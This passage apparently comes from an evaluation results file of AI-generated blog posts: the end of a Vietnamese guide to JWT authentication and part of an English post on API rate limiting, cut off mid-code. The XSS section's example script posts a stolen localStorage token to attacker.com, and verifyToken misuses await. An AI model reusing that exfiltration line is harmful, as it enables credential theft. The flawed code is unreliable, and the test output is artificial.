Ph\u00e1p L\u01b0u Tr\u1eef | L\u1ed7 H\u1ed5ng XSS | L\u1ed7 H\u1ed5ng CSRF | Tr\u01b0\u1eddng H\u1ee3p S\u1eed D\u1ee5ng T\u1ed1t Nh\u1ea5t |\n| ------------------- | ----------- | ------------ | ----------------------------------- |\n| localStorage | Cao | Th\u1ea5p | SPA \u0111\u01a1n gi\u1ea3n v\u1edbi b\u1ea3o v\u1ec7 XSS m\u1ea1nh |\n| httpOnly Cookie | Th\u1ea5p | Trung b\u00ecnh | \u1ee8ng d\u1ee5ng production v\u1edbi b\u1ea3o v\u1ec7 CSRF |\n| B\u1ed9 nh\u1edb + httpOnly | Th\u1ea5p | Trung b\u00ecnh | Khuy\u1ebfn ngh\u1ecb cho \u1ee9ng d\u1ee5ng nh\u1ea1y c\u1ea3m |\n\n## Lu\u1ed3ng L\u00e0m M\u1edbi Token\n\nC\u01a1 ch\u1ebf l\u00e0m m\u1edbi token l\u00e0 c\u1ea7n thi\u1ebft \u0111\u1ec3 duy tr\u00ec phi\u00ean ng\u01b0\u1eddi d\u00f9ng m\u00e0 kh\u00f4ng y\u00eau c\u1ea7u x\u00e1c th\u1ef1c l\u1ea1i li\u00ean t\u1ee5c.\n\n### Lu\u1ed3ng L\u00e0m M\u1edbi Ti\u00eau Chu\u1ea9n\n\n```\n1. Ng\u01b0\u1eddi d\u00f9ng \u0111\u0103ng nh\u1eadp\n \u2193\n2. Server c\u1ea5p Access Token (15 ph\u00fat) + Refresh Token (7 ng\u00e0y)\n \u2193\n3. Client th\u1ef1c hi\u1ec7n y\u00eau c\u1ea7u API v\u1edbi Access Token\n \u2193\n4. Access Token h\u1ebft h\u1ea1n\n \u2193\n5. Client ph\u00e1t hi\u1ec7n ph\u1ea3n h\u1ed3i 401 Unauthorized\n \u2193\n6. Client g\u1eedi Refresh Token \u0111\u1ebfn endpoint /refresh-token\n \u2193\n7. Server x\u00e1c th\u1ef1c Refresh Token\n \u2193\n8. Server c\u1ea5p Access Token m\u1edbi (v\u00e0 t\u00f9y ch\u1ecdn Refresh Token m\u1edbi)\n \u2193\n9. Client th\u1eed l\u1ea1i y\u00eau c\u1ea7u ban \u0111\u1ea7u v\u1edbi Access Token m\u1edbi\n```\n\n### V\u00ed D\u1ee5 Tri\u1ec3n Khai\n\n**Ph\u00eda Client (JavaScript):**\n\n```javascript\n// Axios interceptor \u0111\u1ec3 t\u1ef1 \u0111\u1ed9ng l\u00e0m m\u1edbi token\naxios.interceptors.response.use(\n (response) => response,\n async (error) => {\n const originalRequest = error.config;\n\n // N\u1ebfu access token h\u1ebft h\u1ea1n v\u00e0 ch\u00fang ta ch\u01b0a th\u1eed l\u1ea1i\n if (error.response?.status === 401 && !originalRequest._retry) {\n originalRequest._retry = true;\n\n try {\n // Y\u00eau c\u1ea7u access token m\u1edbi b\u1eb1ng refresh token\n const { data } = await axios.post(\n \"/api/auth/refresh\",\n {},\n {\n withCredentials: true, // G\u1eedi httpOnly cookie\n },\n );\n\n // C\u1eadp nh\u1eadt access token\n accessToken = data.accessToken;\n\n // Th\u1eed l\u1ea1i y\u00eau c\u1ea7u ban \u0111\u1ea7u v\u1edbi token m\u1edbi\n originalRequest.headers[\"Authorization\"] = `Bearer ${accessToken}`;\n return axios(originalRequest);\n } catch (refreshError) {\n // Refresh token kh\u00f4ng h\u1ee3p l\u1ec7 - chuy\u1ec3n h\u01b0\u1edbng \u0111\u1ebfn trang \u0111\u0103ng nh\u1eadp\n window.location.href = \"/login\";\n return Promise.reject(refreshError);\n }\n }\n\n return Promise.reject(error);\n },\n);\n```\n\n**Ph\u00eda Server (Node.js/Express):**\n\n```javascript\n// Endpoint l\u00e0m m\u1edbi token\napp.post(\"/api/auth/refresh\", async (req, res) => {\n try {\n // L\u1ea5y refresh token t\u1eeb httpOnly cookie\n const refreshToken = req.cookies.refreshToken;\n\n if (!refreshToken) {\n return res.status(401).json({ error: \"Kh\u00f4ng c\u00f3 refresh token\" });\n }\n\n // X\u00e1c th\u1ef1c refresh token\n const decoded = jwt.verify(refreshToken, REFRESH_TOKEN_SECRET);\n\n // Ki\u1ec3m tra xem refresh token c\u00f3 trong c\u01a1 s\u1edf d\u1eef li\u1ec7u (kh\u00f4ng b\u1ecb thu h\u1ed3i)\n const tokenExists = await db.checkRefreshToken(\n decoded.userId,\n refreshToken,\n );\n if (!tokenExists) {\n return res.status(401).json({ error: \"Refresh token kh\u00f4ng h\u1ee3p l\u1ec7\" });\n }\n\n // T\u1ea1o access token m\u1edbi\n const newAccessToken = jwt.sign(\n { userId: decoded.userId, email: decoded.email },\n ACCESS_TOKEN_SECRET,\n { expiresIn: \"15m\" },\n );\n\n // T\u00f9y ch\u1ecdn c\u1ea5p refresh token m\u1edbi (xoay v\u00f2ng token)\n const newRefreshToken = jwt.sign(\n { userId: decoded.userId },\n REFRESH_TOKEN_SECRET,\n { expiresIn: \"7d\" },\n );\n\n // C\u1eadp nh\u1eadt refresh token trong c\u01a1 s\u1edf d\u1eef li\u1ec7u\n await db.updateRefreshToken(decoded.userId, refreshToken, newRefreshToken);\n\n // Thi\u1ebft l\u1eadp cookie refresh token m\u1edbi\n res.cookie(\"refreshToken\", newRefreshToken, {\n httpOnly: true,\n secure: true,\n sameSite: \"strict\",\n maxAge: 7 * 24 * 60 * 60 * 1000, // 7 ng\u00e0y\n });\n\n // G\u1eedi access token m\u1edbi\n res.json({ accessToken: newAccessToken });\n } catch (error) {\n res.status(401).json({ error: \"Refresh token kh\u00f4ng h\u1ee3p l\u1ec7\" });\n }\n});\n```\n\n### N\u00e2ng Cao: L\u00e0m M\u1edbi Im L\u1eb7ng\n\n\u0110\u1ec3 c\u00f3 tr\u1ea3i nghi\u1ec7m ng\u01b0\u1eddi d\u00f9ng t\u1ed1t h\u01a1n, tri\u1ec3n khai l\u00e0m m\u1edbi token im l\u1eb7ng tr\u01b0\u1edbc khi h\u1ebft h\u1ea1n:\n\n```javascript\n// Ki\u1ec3m tra h\u1ebft h\u1ea1n token v\u00e0 l\u00e0m m\u1edbi ch\u1ee7 \u0111\u1ed9ng\nfunction setupTokenRefresh() {\n setInterval(async () => {\n const decoded = parseJwt(accessToken);\n const expiresIn = decoded.exp * 1000 - Date.now();\n\n // L\u00e0m m\u1edbi 1 ph\u00fat tr\u01b0\u1edbc khi h\u1ebft h\u1ea1n\n if (expiresIn < 60000) {\n await refreshAccessToken();\n }\n }, 30000); // Ki\u1ec3m tra m\u1ed7i 30 gi\u00e2y\n}\n```\n\n### Xoay V\u00f2ng Refresh Token\n\n\u0110\u1ec3 t\u0103ng c\u01b0\u1eddng b\u1ea3o m\u1eadt, tri\u1ec3n khai xoay v\u00f2ng refresh token:\n\n```\n1. Client s\u1eed d\u1ee5ng Refresh Token A \u0111\u1ec3 l\u1ea5y Access Token m\u1edbi\n \u2193\n2. Server c\u1ea5p Access Token m\u1edbi + Refresh Token B m\u1edbi\n \u2193\n3. Server v\u00f4 hi\u1ec7u h\u00f3a Refresh Token A\n \u2193\n4. Client ph\u1ea3i s\u1eed d\u1ee5ng Refresh Token B cho l\u1ea7n l\u00e0m m\u1edbi ti\u1ebfp theo\n```\n\n\u0110i\u1ec1u n\u00e0y ng\u0103n ch\u1eb7n c\u00e1c cu\u1ed9c t\u1ea5n c\u00f4ng s\u1eed d\u1ee5ng l\u1ea1i refresh token.\n\n## C\u00e1c V\u1ea5n \u0110\u1ec1 B\u1ea3o M\u1eadt\n\nX\u00e1c th\u1ef1c JWT gi\u1edbi thi\u1ec7u m\u1ed9t s\u1ed1 c\u00e2n nh\u1eafc b\u1ea3o m\u1eadt ph\u1ea3i \u0111\u01b0\u1ee3c gi\u1ea3i quy\u1ebft.\n\n### 1. B\u1ea3o M\u1eadt Token\n\n**T\u1ea5n C\u00f4ng XSS (Cross-Site Scripting)**\n\nN\u1ebfu k\u1ebb t\u1ea5n c\u00f4ng ti\u00eam c\u00e1c script \u0111\u1ed9c h\u1ea1i, ch\u00fang c\u00f3 th\u1ec3 \u0111\u00e1nh c\u1eafp token t\u1eeb localStorage:\n\n```javascript\n// Script \u0111\u1ed9c h\u1ea1i\nconst token = localStorage.getItem(\"accessToken\");\nfetch(\"https://attacker.com/steal\", {\n method: \"POST\",\n body: JSON.stringify({ token }),\n});\n```\n\n**Bi\u1ec7n ph\u00e1p gi\u1ea3m thi\u1ec3u:**\n\n- S\u1eed d\u1ee5ng httpOnly cookies cho c\u00e1c token nh\u1ea1y c\u1ea3m\n- Tri\u1ec3n khai Content Security Policy (CSP)\n- L\u00e0m s\u1ea1ch t\u1ea5t c\u1ea3 \u0111\u1ea7u v\u00e0o c\u1ee7a ng\u01b0\u1eddi d\u00f9ng\n- Gi\u1eef c\u00e1c ph\u1ee5 thu\u1ed9c \u0111\u01b0\u1ee3c c\u1eadp nh\u1eadt\n- S\u1eed d\u1ee5ng c\u00e1c header b\u1ea3o m\u1eadt\n\n```javascript\n// Express security headers\nconst helmet = require(\"helmet\");\napp.use(\n helmet({\n contentSecurityPolicy: {\n directives: {\n defaultSrc: [\"'self'\"],\n scriptSrc: [\"'self'\"],\n },\n },\n }),\n);\n```\n\n**T\u1ea5n C\u00f4ng CSRF (Cross-Site Request Forgery)**\n\nKhi s\u1eed d\u1ee5ng cookies, b\u1ea3o v\u1ec7 ch\u1ed1ng l\u1ea1i CSRF:\n\n```javascript\n// S\u1eed d\u1ee5ng CSRF tokens\nconst csrf = require(\"csurf\");\napp.use(csrf({ cookie: true }));\n\n// Thi\u1ebft l\u1eadp thu\u1ed9c t\u00ednh SameSite cho cookie\nres.cookie(\"refreshToken\", token, {\n httpOnly: true,\n sameSite: \"strict\", // ho\u1eb7c 'lax' cho m\u1ed9t s\u1ed1 \u0111i\u1ec1u h\u01b0\u1edbng cross-site\n secure: true,\n});\n```\n\n### 2. H\u1ebft H\u1ea1n Token\n\n**Kh\u00f4ng bao gi\u1edd s\u1eed d\u1ee5ng token c\u00f3 th\u1eddi gian s\u1ed1ng d\u00e0i m\u00e0 kh\u00f4ng c\u00f3 c\u01a1 ch\u1ebf l\u00e0m m\u1edbi:**\n\n\u274c **Sai:**\n\n```javascript\n// Access token 30 ng\u00e0y - KH\u00d4NG BAO GI\u1edc L\u00c0M NH\u01af V\u1eacY\nconst token = jwt.sign(payload, secret, { expiresIn: \"30d\" });\n```\n\n\u2705 **\u0110\u00fang:**\n\n```javascript\n// Access token c\u00f3 th\u1eddi gian s\u1ed1ng ng\u1eafn\nconst accessToken = jwt.sign(payload, secret, { expiresIn: \"15m\" });\n// Refresh token c\u00f3 th\u1eddi gian s\u1ed1ng d\u00e0i (l\u01b0u tr\u1eef an to\u00e0n)\nconst refreshToken = jwt.sign(payload, refreshSecret, { expiresIn: \"7d\" });\n```\n\n### 3. Qu\u1ea3n L\u00fd Secret\n\n**Kh\u00f4ng bao gi\u1edd hardcode secret ho\u1eb7c commit ch\u00fang v\u00e0o version control:**\n\n\u274c **Sai:**\n\n```javascript\nconst secret = \"myS3cr3tK3y\"; // KH\u00d4NG BAO GI\u1edc L\u00c0M NH\u01af V\u1eacY\n```\n\n\u2705 **\u0110\u00fang:**\n\n```javascript\n// S\u1eed d\u1ee5ng bi\u1ebfn m\u00f4i tr\u01b0\u1eddng\nconst secret = process.env.JWT_SECRET;\n\n// S\u1eed d\u1ee5ng secret m\u1ea1nh, ng\u1eabu nhi\u00ean\nconst crypto = require(\"crypto\");\nconst secret = crypto.randomBytes(64).toString(\"hex\");\n```\n\n### 4. X\u00e1c Th\u1ef1c Token\n\nLu\u00f4n x\u00e1c th\u1ef1c token \u0111\u00fang c\u00e1ch:\n\n```javascript\n// X\u00e1c th\u1ef1c token to\u00e0n di\u1ec7n\nfunction verifyToken(token) {\n try {\n const decoded = jwt.verify(token, JWT_SECRET, {\n algorithms: ['HS256'], // Ch\u1ec9 \u0111\u1ecbnh c\u00e1c thu\u1eadt to\u00e1n \u0111\u01b0\u1ee3c ph\u00e9p\n issuer: 'your-app', // X\u00e1c minh token issuer\n audience: 'your-api' // X\u00e1c minh audience d\u1ef1 \u0111\u1ecbnh\n });\n\n // Ki\u1ec3m tra b\u1ed5 sung\n if (!decoded.userId) {\n throw new Error('C\u1ea5u tr\u00fac token kh\u00f4ng h\u1ee3p l\u1ec7');\n }\n\n // Ki\u1ec3m tra xem ng\u01b0\u1eddi d\u00f9ng v\u1eabn t\u1ed3n t\u1ea1i v\u00e0 \u0111ang ho\u1ea1t \u0111\u1ed9ng\n const user = await db.findUser(decoded.userId);\n if (!user || !user.isActive) {\n throw new Error('Kh\u00f4ng t\u00ecm th\u1ea5y ng\u01b0\u1eddi d\u00f9ng ho\u1eb7c kh\u00f4ng ho\u1ea1t \u0111\u1ed9ng');\n }\n\n return decoded;\n } catch (error) {\n throw new Error('X\u00e1c th\u1ef1c token th\u1ea5t b\u1ea1i');\n }\n}\n```\n\n### 5. Thu H\u1ed3i Token\n\nTri\u1ec3n khai chi\u1ebfn l\u01b0\u1ee3c thu h\u1ed3i token:\n\n**Ph\u01b0\u01a1ng Ph\u00e1p Blacklist:**\n\n```javascript\n// L\u01b0u tr\u1eef c\u00e1c token b\u1ecb thu h\u1ed3i trong Redis\nasync function revokeToken(token) {\n const decoded = jwt.decode(token);\n const expiresIn = decoded.exp - Math.floor(Date.now() / 1000);\n\n // L\u01b0u tr\u1eef trong Redis v\u1edbi th\u1eddi gian h\u1ebft h\u1ea1n\n await redis.setex(`blacklist:${token}`, expiresIn, \"revoked\");\n}\n\n// Ki\u1ec3m tra xem token c\u00f3 b\u1ecb thu h\u1ed3i kh\u00f4ng\nasync function isTokenRevoked(token) {\n const revoked = await redis.get(`blacklist:${token}`);\n return revoked !== null;\n}\n```\n\n**Whitelist Refresh Token:**\n\n```javascript\n// L\u01b0u tr\u1eef c\u00e1c refresh token h\u1ee3p l\u1ec7 trong c\u01a1 s\u1edf d\u1eef li\u1ec7u\n// D\u1ec5 d\u00e0ng qu\u1ea3n l\u00fd v\u00e0 thu h\u1ed3i h\u01a1n\nasync function storeRefreshToken(userId, token) {\n await db.refreshTokens.insert({\n userId,\n token: hashToken(token),\n createdAt: new Date(),\n expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),\n });\n}\n\n// Thu h\u1ed3i t\u1ea5t c\u1ea3 refresh token cho m\u1ed9t ng\u01b0\u1eddi d\u00f9ng (\u0111\u0103ng xu\u1ea5t \u1edf m\u1ecdi n\u01a1i)\nasync function revokeAllUserTokens(userId) {\n await db.refreshTokens.deleteMany({ userId });\n}\n```\n\n### 6. C\u00e1c Ph\u01b0\u01a1ng Ph\u00e1p Hay Nh\u1ea5t V\u1ec1 B\u1ea3o M\u1eadt B\u1ed5 Sung\n\n**Lu\u00f4n S\u1eed D\u1ee5ng HTTPS:**\n\n```javascript\n// Chuy\u1ec3n h\u01b0\u1edbng HTTP sang HTTPS\napp.use((req, res, next) => {\n if (req.header(\"x-forwarded-proto\") !== \"https\") {\n res.redirect(`https://${req.header(\"host\")}${req.url}`);\n } else {\n next();\n }\n});\n```\n\n**Tri\u1ec3n Khai Rate Limiting:**\n\n```javascript\nconst rateLimit = require(\"express-rate-limit\");\n\nconst loginLimiter = rateLimit({\n windowMs: 15 * 60 * 1000, // 15 ph\u00fat\n max: 5, // 5 y\u00eau c\u1ea7u m\u1ed7i c\u1eeda s\u1ed5\n message: \"Qu\u00e1 nhi\u1ec1u l\u1ea7n th\u1eed \u0111\u0103ng nh\u1eadp, vui l\u00f2ng th\u1eed l\u1ea1i sau\",\n});\n\napp.post(\"/api/auth/login\", loginLimiter, loginHandler);\n```\n\n**Gi\u00e1m S\u00e1t v\u00e0 Ghi Log C\u00e1c S\u1ef1 Ki\u1ec7n B\u1ea3o M\u1eadt:**\n\n```javascript\n// Ghi log c\u00e1c s\u1ef1 ki\u1ec7n x\u00e1c th\u1ef1c\nfunction logAuthEvent(event, userId, ip) {\n logger.info({\n event,\n userId,\n ip,\n timestamp: new Date(),\n userAgent: req.headers[\"user-agent\"],\n });\n}\n\n// V\u00ed d\u1ee5\nlogAuthEvent(\"LOGIN_SUCCESS\", user.id, req.ip);\nlogAuthEvent(\"TOKEN_REFRESH\", user.id, req.ip);\nlogAuthEvent(\"INVALID_TOKEN\", null, req.ip);\n```\n\n### Danh S\u00e1ch Ki\u1ec3m Tra B\u1ea3o M\u1eadt\n\n- [ ] S\u1eed d\u1ee5ng access token c\u00f3 th\u1eddi gian s\u1ed1ng ng\u1eafn (15-30 ph\u00fat)\n- [ ] L\u01b0u tr\u1eef refresh token trong httpOnly cookies\n- [ ] Tri\u1ec3n khai c\u01a1 ch\u1ebf l\u00e0m m\u1edbi token\n- [ ] S\u1eed d\u1ee5ng HTTPS trong production\n- [ ] Thi\u1ebft l\u1eadp c\u00e1c c\u1edd cookie an to\u00e0n (httpOnly, secure, sameSite)\n- [ ] Tri\u1ec3n khai b\u1ea3o v\u1ec7 CSRF\n- [ ] S\u1eed d\u1ee5ng secret m\u1ea1nh, \u0111\u01b0\u1ee3c t\u1ea1o ng\u1eabu nhi\u00ean\n- [ ] Kh\u00f4ng bao gi\u1edd commit secret v\u00e0o version control\n- [ ] X\u00e1c th\u1ef1c token k\u1ef9 l\u01b0\u1ee1ng\n- [ ] Tri\u1ec3n khai thu h\u1ed3i token\n- [ ] Th\u00eam rate limiting tr\u00ean c\u00e1c endpoint auth\n- [ ] Ghi log c\u00e1c s\u1ef1 ki\u1ec7n b\u1ea3o m\u1eadt\n- [ ] S\u1eed d\u1ee5ng Content Security Policy\n- [ ] Gi\u1eef c\u00e1c ph\u1ee5 thu\u1ed9c \u0111\u01b0\u1ee3c c\u1eadp nh\u1eadt\n- [ ] Tri\u1ec3n khai xoay v\u00f2ng refresh token\n\n## K\u1ebft Lu\u1eadn\n\nX\u00e1c th\u1ef1c JWT l\u00e0 m\u1ed9t c\u00e1ch ti\u1ebfp c\u1eadn m\u1ea1nh m\u1ebd v\u00e0 linh ho\u1ea1t \u0111\u1ec3 b\u1ea3o m\u1eadt c\u00e1c \u1ee9ng d\u1ee5ng web hi\u1ec7n \u0111\u1ea1i. B\u1eb1ng c\u00e1ch hi\u1ec3u s\u1ef1 kh\u00e1c bi\u1ec7t gi\u1eefa access token v\u00e0 refresh token, c\u1ea9n th\u1eadn l\u1ef1a ch\u1ecdn c\u00e1c chi\u1ebfn l\u01b0\u1ee3c l\u01b0u tr\u1eef token, tri\u1ec3n khai c\u00e1c lu\u1ed3ng l\u00e0m m\u1edbi th\u00edch h\u1ee3p v\u00e0 gi\u1ea3i quy\u1ebft c\u00e1c v\u1ea5n \u0111\u1ec1 b\u1ea3o m\u1eadt, b\u1ea1n c\u00f3 th\u1ec3 x\u00e2y d\u1ef1ng m\u1ed9t h\u1ec7 th\u1ed1ng x\u00e1c th\u1ef1c m\u1ea1nh m\u1ebd.\n\n**Nh\u1eefng \u0110i\u1ec3m Ch\u00ednh:**\n\n1. **S\u1eed d\u1ee5ng hai token**: Access token c\u00f3 th\u1eddi gian s\u1ed1ng ng\u1eafn + refresh token c\u00f3 th\u1eddi gian s\u1ed1ng d\u00e0i\n2. **L\u01b0u tr\u1eef an to\u00e0n**: httpOnly cookies cho refresh token, b\u1ed9 nh\u1edb ho\u1eb7c httpOnly cookies cho access token\n3. **Tri\u1ec3n khai lu\u1ed3ng l\u00e0m m\u1edbi**: L\u00e0m m\u1edbi token t\u1ef1 \u0111\u1ed9ng cho tr\u1ea3i nghi\u1ec7m ng\u01b0\u1eddi d\u00f9ng li\u1ec1n m\u1ea1ch\n4. **\u01afu ti\u00ean b\u1ea3o m\u1eadt**: B\u1ea3o v\u1ec7 XSS, b\u1ea3o v\u1ec7 CSRF, HTTPS, x\u00e1c th\u1ef1c \u0111\u00fang c\u00e1ch v\u00e0 thu h\u1ed3i token\n\nH\u00e3y nh\u1edb r\u1eb1ng, b\u1ea3o m\u1eadt kh\u00f4ng ph\u1ea3i l\u00e0 m\u1ed9t l\u1ea7n tri\u1ec3n khai m\u00e0 l\u00e0 m\u1ed9t qu\u00e1 tr\u00ecnh li\u00ean t\u1ee5c. Lu\u00f4n c\u1eadp nh\u1eadt v\u1edbi c\u00e1c ph\u01b0\u01a1ng ph\u00e1p hay nh\u1ea5t v\u1ec1 b\u1ea3o m\u1eadt m\u1edbi nh\u1ea5t v\u00e0 th\u01b0\u1eddng xuy\u00ean ki\u1ec3m tra tri\u1ec3n khai x\u00e1c th\u1ef1c c\u1ee7a b\u1ea1n.\n\n---\n\n_C\u00f3 c\u00e2u h\u1ecfi ho\u1eb7c \u0111\u1ec1 xu\u1ea5t? \u0110\u1eebng ng\u1ea7n ng\u1ea1i li\u00ean h\u1ec7 trong ph\u1ea7n b\u00ecnh lu\u1eadn b\u00ean d\u01b0\u1edbi!_\n"}], "grading": null}, {"id": "rate-limiting-with_skill", "prompt": "Turn detailed outline into blog post about API rate limiting", "eval_id": 5, "outputs": [{"name": "blog-post-en.md", "type": "text", "content": "# Rate Limiting APIs: Protecting Your System from Abuse\n\n> **For developers building and operating API services**\n\nImagine you're running an API service that serves thousands of users. One day, your server starts struggling, your database slows to a crawl, and users begin complaining about degraded performance. When you check the logs, you discover a single client is sending thousands of requests per second - either due to a bug in their code or, worse, a deliberate attack.\n\nThis is when **rate limiting** becomes critical. It's not just a \"nice-to-have\" feature - it's an essential component of modern API architecture.\n\n## Part 1: Why Rate Limiting Matters\n\n### 1.1 Protecting System Resources\n\nYour API runs on finite resources - CPU, memory, database connections, network bandwidth. Each request consumes these resources. Without limits, a single client (whether intentionally or accidentally) could monopolize all resources, making your service unavailable to everyone else.\n\n**Real-world example:**\n\n```javascript\n// An accidental infinite loop without delay\nfor (let i = 0; i < 10000; i++) {\n fetch(\"https://api.example.com/users\").then((response) => response.json());\n}\n// 10,000 requests fired simultaneously!\n```\n\n### 1.2 Preventing Abuse and Attacks\n\nRate limiting is your first line of defense against:\n\n- **DDoS attacks** - Distributed denial of service\n- **Credential stuffing** - Attempting login with many account combinations\n- **Web scraping** - Unauthorized data harvesting\n- **API abuse** - Using the API beyond permitted purposes\n\n### 1.3 Ensuring Fair Usage\n\nNot all users have equal resource needs, but all users deserve to be served. Rate limiting ensures that:\n\n- A power user can't negatively impact other users' experience\n- Resources are distributed fairly among users\n- Free tier users can't consume resources like paid users\n\n### 1.4 Controlling Costs\n\nIf your API uses third-party services that charge by usage, rate limiting helps:\n\n- Control infrastructure costs\n- Avoid \"bill shock\" from unexpected usage spikes\n- Align pricing tiers with actual resource costs\n\n---\n\n## Part 2: Rate Limiting Strategies\n\nThere are various algorithms for implementing rate limiting, each with its own trade-offs. Let's explore the most popular strategies in detail.\n\n### 2.1 Fixed Window Counter\n\n**How it works:**\n\nFixed window divides time into fixed windows (e.g., each minute, each hour). You count requests in each window and reset the counter when a new window begins.\n\n```\nWindow 1 (0-60s) Window 2 (60-120s) Window 3 (120-180s)\n[===========] [===========] [===========]\nCounter: 45 Counter: 0\u219252 Counter: 0\u219238\n```\n\n**Simple implementation:**\n\n```javascript\nconst rateLimit = {\n windowStart: Date.now(),\n windowSize: 60000, // 1 minute\n maxRequests: 100,\n counter: 0,\n};\n\nfunction allowRequest() {\n const now = Date.now();\n\n // Reset if new window started\n if (now - rateLimit.windowStart >= rateLimit.windowSize) {\n rateLimit.windowStart = now;\n rateLimit.counter = 0;\n }\n\n if (rateLimit.counter < rateLimit.maxRequests) {\n rateLimit.counter++;\n return true;\n }\n\n return false;\n}\n```\n\n**\u2705 Advantages:**\n\n- Extremely simple to implement\n- Memory efficient (only need counter and timestamp)\n- Easy to reason about behavior\n\n**\u274c Disadvantages:**\n\n- **Burst problem at window edges** - Users can send 100 requests at the end of window 1, then 100 more at the start of window 2 = 200 requests in 1 second!\n\n```\nWindow 1 end Window 2 start\n \u2193 \u2193\n[..................] | [.....................]\n ^^^^^^^^\n 200 requests in 1 second!\n```\n\n### 2.2 Sliding Window Log\n\n**How it works:**\n\nInstead of fixed windows, sliding window tracks the timestamp of each request. When a new request arrives, you remove timestamps older than the window size and count remaining requests.\n\n```javascript\nconst requestLog = [];\nconst windowSize = 60000; // 1 minute\nconst maxRequests = 100;\n\nfunction allowRequest() {\n const now = Date.now();\n\n // Remove requests older than window size\n const validRequests = requestLog.filter(\n (timestamp) => now - timestamp < windowSize,\n );\n\n if (validRequests.length < maxRequests) {\n requestLog.push(now);\n return true;\n }\n\n return false;\n}\n```\n\n**Visualization:**\n\n```\n Current time\n \u2193\n|-------|-------|-------|-------|\n 54s 55s 56s 57s 58s\n \u2191 \u2191 \u2191\n Old (removed) Valid Valid\n```\n\n**\u2705 Advantages:**\n\n- Very accurate - no burst problem\n- True sliding window\n- Easy to debug (can see entire request history)\n\n**\u274c Disadvantages:**\n\n- Memory intensive - must store timestamp of every request\n- Needs cleanup logic to remove old entries\n- Doesn't scale well with high traffic\n\n### 2.3 Sliding Window Counter\n\n**How it works:**\n\nThis is a hybrid approach combining fixed windows with weighted calculation. You maintain counters for the current and previous windows, then calculate the rate based on a weighted average.\n\n```javascript\nconst windows = {\n previous: { start: Date.now() - 60000, count: 80 },\n current: { start: Date.now(), count: 20 },\n};\n\nfunction allowRequest() {\n const now = Date.now();\n const windowSize = 60000;\n const maxRequests = 100;\n\n // If current window has expired\n if (now - windows.current.start >= windowSize) {\n windows.previous = windows.current;\n windows.current = { start: now, count: 0 };\n }\n\n // Calculate % overlap with previous window\n const elapsedInCurrent = now - windows.current.start;\n const overlapPercent = (windowSize - elapsedInCurrent) / windowSize;\n\n // Weighted count\n const estimatedCount =\n windows.previous.count * overlapPercent + windows.current.count;\n\n if (estimatedCount < maxRequests) {\n windows.current.count++;\n return true;\n }\n\n return false;\n}\n```\n\n**\u2705 Advantages:**\n\n- More accurate than fixed window\n- More memory efficient than sliding log\n- Minimizes burst problem\n\n**\u274c Disadvantages:**\n\n- More complex to implement\n- Still uses approximation (not 100% accurate)\n\n### 2.4 Token Bucket\n\n**How it works:**\n\nImagine a bucket containing tokens. Tokens are added to the bucket at a fixed rate. Each request consumes a token. If the bucket is empty, the request is rejected.\n\n```\nBucket capacity: 100 tokens\nRefill rate: 10 tokens/second\n\nTime 0s: [====================] 100 tokens\n\u2193 20 requests\nTime 1s: [================ ] 90 tokens (80 used, +10 refilled)\n\u2193 5 requests\nTime 2s: [================= ] 95 tokens (85 used, +10 refilled)\n```\n\n**Implementation:**\n\n```javascript\nclass TokenBucket {\n constructor(capacity, refillRate) {\n this.capacity = capacity;\n this.tokens = capacity;\n this.refillRate = refillRate; // tokens per second\n this.lastRefill = Date.now();\n }\n\n refill() {\n const now = Date.now();\n const timePassed = (now - this.lastRefill) / 1000; // seconds\n const tokensToAdd = timePassed * this.refillRate;\n\n this.tokens = Math.min(this.capacity, this.tokens + tokensToAdd);\n this.lastRefill = now;\n }\n\n allowRequest(cost = 1) {\n this.refill();\n\n if (this.tokens >= cost) {\n this.tokens -= cost;\n return true;\n }\n\n return false;\n }\n}\n\n// Usage\nconst bucket = new TokenBucket(100, 10);\nif (bucket.allowRequest()) {\n // Process request\n}\n```\n\n**\u2705 Advantages:**\n\n- **Allows bursts** - If users don't use all tokens, they can \"save up\" for bursts later\n- Flexible - Can assign different costs to different operations\n- Smooth long-term rate\n\n**\u274c Disadvantages:**\n\n- Can allow large bursts if bucket capacity is high\n- Needs careful tuning of capacity and refill rate\n\n**Good use case:** APIs with variable load patterns where users need occasional bursts\n\n### 2.5 Leaky Bucket\n\n**How it works:**\n\nSimilar to token bucket, but reversed: requests are added to a queue (bucket) and processed at a fixed rate - like water \"leaking\" from a bucket with a hole.\n\n```\nRequests in \u2192 [=====Queue=====] \u2192 Process out (fixed rate)\n [ R1 R2 R3 R4 ]\n \u2193 \u2193 \u2193 \u2193\n Process 1 request/second\n```\n\n**Implementation:**\n\n```javascript\nclass LeakyBucket {\n constructor(capacity, leakRate) {\n this.capacity = capacity;\n this.queue = [];\n this.leakRate = leakRate; // requests per second\n this.lastLeak = Date.now();\n }\n\n leak() {\n const now = Date.now();\n const timePassed = (now - this.lastLeak) / 1000;\n const leakCount = Math.floor(timePassed * this.leakRate);\n\n // Remove requests that have \"leaked\"\n this.queue.splice(0, leakCount);\n this.lastLeak = now;\n }\n\n allowRequest(request) {\n this.leak();\n\n if (this.queue.length < this.capacity) {\n this.queue.push(request);\n return true;\n }\n\n return false; // Bucket full, reject request\n }\n}\n```\n\n**\u2705 Advantages:**\n\n- **Smooth, constant output rate** - Protects downstream services\n- Can queue requests instead of immediate rejection\n- Predictable load on backend\n\n**\u274c Disadvantages:**\n\n- Requests may be delayed (due to queuing)\n- Need to manage queue (memory, timeouts)\n- Can cause high latency for users\n\n**Good use case:** When you need to protect downstream services with strict rate requirements\n\n---\n\n## Part 3: Production Implementation\n\n### 3.1 Distributed Systems with Redis\n\nWhen your application runs on multiple servers, you need shared state to track rate limits across all instances. Redis is the most popular solution.\n\n**Token Bucket with Redis:**\n\n```javascript\nconst Redis = require(\"ioredis\");\nconst redis = new Redis();\n\nasync function allowRequest(userId, capacity, refillRate) {\n const key = `rate_limit:${userId}`;\n const now = Date.now();\n\n // Lua script to ensure atomicity\n const script = `\n local key = KEYS[1]\n local capacity = tonumber(ARGV[1])\n local refillRate = tonumber(ARGV[2])\n local now = tonumber(ARGV[3])\n \n local bucket = redis.call('HMGET', key, 'tokens', 'lastRefill')\n local tokens = tonumber(bucket[1]) or capacity\n local lastRefill = tonumber(bucket[2]) or now\n \n -- Refill tokens\n local timePassed = (now - lastRefill) / 1000\n local tokensToAdd = timePassed * refillRate\n tokens = math.min(capacity, tokens + tokensToAdd)\n \n -- Check if request allowed\n if tokens >= 1 then\n tokens = tokens - 1\n redis.call('HMSET', key, 'tokens', tokens, 